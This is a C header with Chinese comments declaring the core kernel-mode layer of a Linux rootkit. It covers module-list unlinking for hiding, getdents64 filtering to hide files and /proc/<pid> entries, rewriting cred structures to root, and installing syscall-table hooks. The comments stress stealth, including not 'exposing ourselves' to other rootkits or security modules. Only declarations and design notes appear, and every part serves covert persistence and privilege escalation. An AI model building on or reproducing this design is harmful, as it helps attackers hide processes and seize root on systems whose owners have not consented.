#ifndef LKM_H
#define LKM_H

#include <stdint.h>
#include <stddef.h>

/* cred 布局由 22_kern 运行时探测得出，本层只消费不重新定义，
 * 避免两处布局定义漂移。 */
#include "kern.h"

/* ------------------------------------------------------------------ *
 * 23_lkm — 内核态操作核心（版本自适应）
 *
 * 本层不定义任何内核结构体，也不使用任何内核头文件。
 * 所有操作都表达为"给定偏移的裸内存读改"，因此：
 *
 *   - 在 LKM 内：读写回调直接解引用内核指针
 *   - 在用户态测试：读写回调打到一块 mock 内存
 *   - 在 22_kern：读回调走 /proc/kcore（只读）
 *
 * 这样做的原因是跨版本：struct cred / struct module / struct task_struct
 * 的字段偏移在不同内核间会变。编译期常量会在目标机上静默写错位置——
 * 那不是"失败"，是"写成另一个字段"，最难排查。
 *
 * 因此本层有一条硬规则：cred 操作只接受运行时探测过的布局
 * （klayout_cred.probed == 1），拒绝任何猜测值。
 * ------------------------------------------------------------------ */

#define LKM_OK              0
#define LKM_ERR_PARAM      -1
#define LKM_ERR_IO         -2
#define LKM_ERR_CORRUPT    -3   /* 被操作的数据结构自相矛盾 */
#define LKM_ERR_NOTFOUND   -4   /* 节点不在链表上 / 无匹配项 */
#define LKM_ERR_FOREIGN    -5   /* 目标已被第三方改动，拒绝覆盖 */
#define LKM_ERR_ALREADY    -6   /* 已是目标状态，无需重复操作 */
#define LKM_ERR_LAYOUT     -7   /* 布局未探测，拒绝猜测 */
#define LKM_ERR_RANGE      -8   /* 访问越出可读写区 */

const char *lkm_strerror(int rc);

/* ====================== 内核内存读写接口 ====================== */

typedef struct lkm_mem lkm_mem;

struct lkm_mem {
    /* 返回 LKM_OK 或负错误码。n 字节必须全部读/写完，短读写视为 IO 错误。 */
    int  (*rd)(void *ud, uint64_t va, void *buf, size_t n);
    int  (*wr)(void *ud, uint64_t va, const void *buf, size_t n);
    void *ud;
};

/* ======================== 双向链表摘除 ======================== */

/* 摘除循环双向链表中的 node。等价于 list_del_init 之后把 node 自环，
 * 但先在宿主内存里校验前后指针的互指关系：
 *
 *   校验失败 -> LKM_ERR_CORRUPT，且**不改任何内存**
 *
 * 这条校验不是洁癖：内核链表被并发修改时（我们摘的同时 reload/rmmod
 * 也在动它），无校验的写入会把别人的指针写坏，表现为随机 oops。
 *
 * next_off / prev_off 由调用方给出（struct list_head 在宿主结构内的偏移）。
 * 摘除后默认把 node 的 next/prev 都写回 node 自身（自环）：
 *   - 不写 0，避免后续遍历空指针
 *   - 不写 LIST_POISON，避免非规范地址触发 oops
 */
#define LKM_UNLINK_KEEP  0x01   /* 摘除后不改写 node 自身的指针 */

int lkm_unlink_node(lkm_mem *m, uint64_t node,
                    size_t next_off, size_t prev_off, unsigned flags);

/* ==================== getdents / getdents64 过滤 ==================== */

/* struct linux_dirent64 是用户态 ABI，跨内核稳定，不需要运行时探测：
 *   +0  d_ino    u64
 *   +8  d_off    s64
 *   +16 d_reclen u16
 *   +18 d_type   u8
 *   +19 d_name   变长（NUL 结尾）
 *
 * 返回 1 表示隐藏该条目。 */
typedef int (*lkm_hide_cb)(const char *name, uint64_t ino, uint8_t type,
                           void *ud);

/* 就地过滤缓冲区。被隐藏的条目直接被后续内容整体前移覆盖，
 * 保证缓冲区始终是合法的 dirent64 序列。
 *
 * *out_len 返回新长度（可能 0）。*out_removed 返回被隐藏条数（可为 NULL）。
 *
 * 畸形输入（d_reclen == 0 / 越出缓冲区 / 小于头部长度）一律
 * LKM_ERR_CORRUPT 且不动缓冲区——宁可让调用方拿到原始列表，
 * 也不要写出一段让 ls 死循环或崩溃的缓冲区。 */
int lkm_dirent_filter(void *buf, size_t len,
                      lkm_hide_cb cb, void *ud,
                      size_t *out_len, size_t *out_removed);

/* 便利：隐藏名字等于 name 的条目（精确匹配，二进制比较） */
int lkm_dirent_hide_name(const char *name, uint64_t ino, uint8_t type, void *ud);

/* 便利：隐藏名字全部为数字且数值等于 *(pid_t*)ud 的条目（用于藏 /proc/<pid>） */
int lkm_dirent_hide_pid(const char *name, uint64_t ino, uint8_t type, void *ud);

/* ========================== 凭据提升 ========================== */

/* 直接改写一块 cred 内存为 root 全集。偏移必须来自运行时探测。
 *
 * 不改 usage（引用计数）：改它会破坏 refcount 平衡，
 * 在 cred 被多处共享时造成 use-after-free。提权不需要动它。 */
int lkm_cred_apply(lkm_mem *m, uint64_t cred, const klayout_cred *L);

/* 校验一份布局是否可用于提权（probed 必须为 1，且关键偏移非零且互斥） */
int lkm_cred_layout_ok(const klayout_cred *L);

/* ====================== syscall 表 hook 装卸 ====================== */

/* 安装：读出原值写入 *orig，再写入 new。
 * 若原位已经是 new -> LKM_ERR_ALREADY（不重复写，避免丢掉 orig）。 */
int lkm_hook_install(lkm_mem *m, uint64_t table, int nr,
                     uint64_t new_fn, uint64_t *orig);

/* 恢复：仅当当前值 == cur_expected 时才写回 orig。
 * 当前值是别的地址 -> LKM_ERR_FOREIGN，拒绝覆盖：
 * 那是第三方（另一个 rootkit / 安全模块）在 ours 之后又装了一层，
 * 盲写 orig 会把它整条 hook 链抹掉，暴露我们自己。 */
int lkm_hook_restore(lkm_mem *m, uint64_t table, int nr,
                     uint64_t cur_expected, uint64_t orig);

/* ========================== 自检 ========================== */

/* 在 mock 内存上跑一遍全部不变量，供宿主启动自检调用。
 * 真实 LKM 里它跑在纯内存上，不碰任何内核结构。 */
int lkm_selftest(void);

#endif /* LKM_H */
